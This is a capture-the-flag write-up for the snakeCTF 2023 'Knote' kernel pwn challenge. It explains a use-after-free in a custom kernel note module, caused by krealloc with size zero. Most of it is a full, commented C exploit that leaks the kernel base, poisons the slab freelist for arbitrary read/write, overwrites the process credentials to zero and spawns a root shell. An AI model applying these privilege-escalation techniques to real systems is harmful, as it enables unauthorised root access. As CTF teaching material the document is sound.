# Knote [_snakeCTF 2023_]

**Category**: pwn


## Description

I know, no one has ever thought of implementing notes in kernel-space... and it has definitely never gone wrong!

I swear, this time it will be different! Trust me, it's totally safe and production ready!

## Solution

### Reversing

The kernel loads a custom module, called knote, which uses `unlocked_ioctl` with a proper lock to allow access to its functionalities. The module uses the following structs:

```c
typedef struct knote_t {
  char title[TITLE_MAX_SIZE];
  char *description;
  size_t desc_len;
  uid_t owner;
} knote_t;

typedef struct {
  char *title;
  char *description;
  size_t desc_len;
  uid_t owner;
} req_t;
```

The first is allocated on the kernel heap, the latter is used to communicate with userspace. There is no double-fetch (hopefully).

The functionalities of the module are the following:

- adding a note
- getting the size and owner of a note
- getting a full note, including description
- editing the description of a note
- transferring a note to another user, aka changing the owner
- removing a note

### Vulnerability

The bug is hard to spot and requires having read the manual for `krealloc`. The edit functionality is flawed: it allows to `krealloc` with a size of zero, which according to the manual is equivalent to calling `kfree`, leading to a use-after-free vulnerability.

### Exploitation

There are many possibilities for the size of the note to use. Different sizes allow overlapping different kernel structures with our note.

Here's a heavily commented and explained exploit:

```c
#include "utils.h"
#include <errno.h>
#include <fcntl.h>
#include <signal.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <sys/ioctl.h>
#include <sys/msg.h>
#include <sys/wait.h>
#include <unistd.h>

/*
 *     useful defines
 */

#define TITLE_MAX_SIZE (0x30)

#define ADD_NOTE 0xd00d0000
#define INFO_NOTE 0xd00d0001
#define VIEW_NOTE 0xd00d0002
#define EDIT_NOTE 0xd00d0003
#define TRANSFER_NOTE 0xd00d0004
#define REMOVE_NOTE 0xd00d0005

#define A "a\0                                              "
#define B "b\0                                              "
#define C "c\0                                              "
#define D "d\0                                              "
#define E "e\0                                              "

#define KERN_LEAK_OFF (0x2b4670)
#define NEXT_TASK_OFFSET (0x458)
#define PID_OFFSET (0x520)
#define CRED_OFFSET (0x708)
#define CRED_UID_OFF (0x4)
#define CRED_EUID_OFF (0x14)

/*
 *     structs and globals
 */

typedef struct knote_t {
  char title[TITLE_MAX_SIZE];
  char *description;
  size_t desc_len;
  uid_t owner;
} knote_t;

typedef struct {
  char *title;
  char *description;
  size_t desc_len;
  uid_t owner;
} req_t;

req_t req;
int fd;
int msqid;

/*
 *     /dev/knote utils
 */
long add(char *title, char *desc, unsigned long desc_len) {
  req.title = title;
  req.description = desc;
  req.desc_len = desc_len;
  long res = ioctl(fd, ADD_NOTE, &req);
  printf("[ADD] Res: %ld\n", res);
  return res;
}

long view(char *title, char *desc, unsigned long desc_len) {
  req.title = title;
  req.description = desc;
  req.desc_len = desc_len;
  long res = ioctl(fd, VIEW_NOTE, &req);
  printf("[VIEW] Res: %ld\n", res);
  return res;
}

long info(char *title) {
  req.title = title;
  long res = ioctl(fd, INFO_NOTE, &req);
  printf("[INFO] Res: %ld\n", res);
  return res;
}

long edit(char *title, char *desc, unsigned long desc_len) {
  req.title = title;
  req.description = desc;
  req.desc_len = desc_len;
  long res = ioctl(fd, EDIT_NOTE, &req);
  printf("[EDIT] Res: %ld\n", res);
  return res;
}

long transfer(char *title, uid_t owner) {
  req.title = title;
  req.owner = owner;
  long res = ioctl(fd, TRANSFER_NOTE, &req);
  printf("[TRANSFER] Res: %ld\n", res);
  return res;
}

long del(char *title) {
  req.title = title;
  long res = ioctl(fd, REMOVE_NOTE, &req);
  printf("[REMOVE] Res: %ld\n", res);
  return res;
}

/*
 *     arbitrary read/write primitives
 */
unsigned long arb_read(unsigned long addr) {
  char *desc = malloc(sizeof(knote_t));
  unsigned long res;

  // Fake the C note with our chosen pointers
  memset(desc, 0, sizeof(knote_t));
  strcpy(desc, C);

  *(unsigned long *)&desc[0x30] = addr; // desc ptr
  desc[0x38] = 0x48;                    // size
  *(unsigned long *)&desc[0x40] = 1000; // owner
  edit(B, desc, sizeof(knote_t));
  free(desc);

  // Get the leak by reading note C
  if (view(C, (char *)&res, sizeof(unsigned long)) != 0)
    err("view");
  return res;
}

// NOTE: this destroys the arb_read primitive
void arb_write(unsigned long addr, char *data, unsigned long sz) {
  char *desc = malloc(sizeof(knote_t));

  // Free our victim note B
  del(C);
  view(B, desc, sizeof(knote_t));
  hexdump(desc, sizeof(knote_t));

  // Overwrite the freelist pointer with an arbitrary address
  *(unsigned long *)&desc[0x30] = addr; // freelist ptr
  edit(B, desc, sizeof(knote_t));
  view(B, desc, sizeof(knote_t));
  hexdump(desc, sizeof(knote_t));

  // Now re-create note C. Due to the freelist poisoning, the
  // address returned for the description of note C will be
  // the chosen one (`addr`)
  add(C, data, sz);

  free(desc);
}

/*
 *     main
 */
int main() {
  char desc[0x20];
  fd = open("/dev/knote", O_RDONLY);
  if (fd < 0) {
    err("open");
  }

  // Create a victim note of size 0x20
  add(A, desc, 0x20);
  memset(desc, 0, sizeof(desc));
  view(A, desc, sizeof(desc));
  hexdump(desc, 0x20);

  // Edit with size zero to free the note. As we still can reference it,
  // we have a double free.
  puts("[+] trigger vuln by freeing note description");
  edit(A, desc, 0);

  // To leak the kernel base we can use seq_operations, which is defined as
  // (https://elixir.bootlin.com/linux/v6.6.6/source/include/linux/seq_file.h#L32):
  //      struct seq_operations {
  //      	void * (*start) (struct seq_file *m, loff_t *pos);
  //      	void (*stop) (struct seq_file *m, void *v);
  //      	void * (*next) (struct seq_file *m, void *v, loff_t *pos);
  //      	int (*show) (struct seq_file *m, void *v);
  //      };
  // This struct has a size of 0x20, exactly as our note
  // and will be allocated on top of our A note
  puts("[+] leak kbase using seq_operations");
  open("/proc/self/stat", O_RDONLY);

  // We can now read from A to leak some kernel addresses taken from the
  // seq_operations struct we have allocated
  memset(desc, 0, sizeof(desc));
  view(A, desc, sizeof(desc));
  hexdump(desc, 0x20);

  // To avoid corrupting the kernel heap, keep the file open and free the
  // allocated note
  puts("[+] free the note to clean UAF");
  del(A);

  unsigned long kbase = *(unsigned long *)desc - KERN_LEAK_OFF;
  printf("[+] kbase @ 0x%lx\n", kbase);

  // Create a new victim note of the same size of the knote_t struct
  puts("[+] allocate pwn note");
  char *pwndesc = malloc(sizeof(knote_t));
  memset(pwndesc, 0, sizeof(knote_t));
  add(B, pwndesc, sizeof(knote_t));

  // Trigger the use-after-free vulnerability on our victim
  puts("[+] trigger vuln again");
  edit(B, pwndesc, 0);

  // Allocate a new note on top of the freed chunk of note B
  puts("[+] allocate victim note");
  add(C, pwndesc, sizeof(knote_t));

  // The description of note B now points to note C, meaning that
  // by editing note B we can now control the pointers contained inside
  // note C to arbitrary read/write anything
  puts("[+] now b->desc == c");
  view(B, pwndesc, sizeof(knote_t));
  hexdump(pwndesc, sizeof(knote_t));

  // There are basically three ways to escalate to root:
  // 1. execute `commit_creds(prepare_kernel_cred(0))`
  // 2. overwrite modprobe_path with a controlled path
  // 3. overwrite the credentials of a controlled process with UID 0
  //
  // Of the three methods, the 1st is hard to apply here as we are on the heap
  // and the kernel does not contain many good gadgets for a stack pivot.
  //
  // The 2nd method is not allowed in this challenge as
  // CONFIG_STATIC_USERMODEHELPER is enabled, leading to a readonly
  // modprobe_path (actually, afaik, it's still writable, but it is not used by
  // the kernel apparently).
  //
  // We are left with method 3: we need to overwrite the credentials of our
  // process In order to do so, we can search the PID of our process in the task
  // struct. The task struct is a double-linked list, and each process has its
  // own task struct. Once we find our process, we can overwrite its credentials
  // with null bytes to become root!
  puts("[+] search for our task struct");
  pid_t pid = getpid();
  printf("[+] pid: %d\n", pid);

  // The base of the first task struct is fixed with respect to the kernel base
  unsigned long task = kbase + 0x1A0C900;
  for (;;) {
    // Start reading the PID of the process
    // If it is not the correct one, go to the next and retry
    pid_t task_pid = arb_read(task + PID_OFFSET);
    if (task_pid == pid) {
      printf("[+] process task @ 0x%lx\n", task);

      // Check the process credentials
      unsigned long cred = arb_read(task + CRED_OFFSET);
      printf("[+] process cred @ 0x%lx\n", cred);
      puts("[+] check current UID/EUID");
      uid_t uid = arb_read(cred + CRED_UID_OFF);
      uid_t euid = arb_read(cred + CRED_EUID_OFF);
      printf("[+] uid: %d\n[+] euid: %d\n", uid, euid);

      // We copy a piece of the task struct of our process
      // This is done as we MUST modify the ENTIRE chunk data due to how
      // edit is implemented.
      // Note that:
      //    sizeof(knote_t) -> 0x48 = 72 =>
      //    the actual size of an allocated chunk is 96
#define KNOTE_T_SLAB_SZ (96)
      puts("[+] copying the creds data");
      unsigned long new_cred[KNOTE_T_SLAB_SZ];
      for (int i = 0; i < KNOTE_T_SLAB_SZ; i += sizeof(unsigned long)) {
        new_cred[i / 8] = arb_read(cred + i);
      }

      // Overwrite the UID end EUID with zero, making us effectively root!
      // It may not be required to set both
      puts("[+] setting UID and EUID to zero");
      *(uid_t *)&(((char *)new_cred)[CRED_UID_OFF]) = 0;  // root uid
      *(gid_t *)&(((char *)new_cred)[CRED_EUID_OFF]) = 0; // root gid
      hexdump((char *)new_cred, KNOTE_T_SLAB_SZ);

      // When modifying the task struct we may mess the freelist of kmalloc-192.
      // I don't really know/remember why this happens, but an easy fix is to
      // provide some "fresh" chunks by forking our process, which allocates
      // task structs as expected.
      puts("[+] allocate and free some cred structs (kmalloc-192) to avoid "
           "breaking the freelist when doing arb_write");
      for (int i = 0; i < 10; i++) {
        pid_t p = fork();
        if (p < 0)
          err("fork");
        else if (p == 0) {
          exit(0);
        } else {
          int status;
          waitpid(p, &status, 0);
        }
      }

      // Overwrite with UID and EUID zero
      puts("[+] overwriting process cred");
      arb_write(cred, (char *)new_cred, KNOTE_T_SLAB_SZ);
      break;
    }

    // Note on this weird computation: the double linked list is NOT in the top
    // of the task struct, therefore we must read from an offset to get the next
    // task struct address. Moreover, the double-linked list does NOT point to
    // the top of the task struct, but to the double-linked list pointers of the
    // pointed task struct.
    task = arb_read(task + NEXT_TASK_OFFSET) - NEXT_TASK_OFFSET;
  }

  // Check that the exploit was successful
  if (getuid() != 0 || geteuid() != 0) {
    puts("[-] not root :(");
    exit(1);
  }

  // cleanup
  free(pwndesc);

  // Enjoy a root shell!
  puts("[+] spawning root shell");
  execl("/bin/sh", "/bin/sh", NULL);
}
```


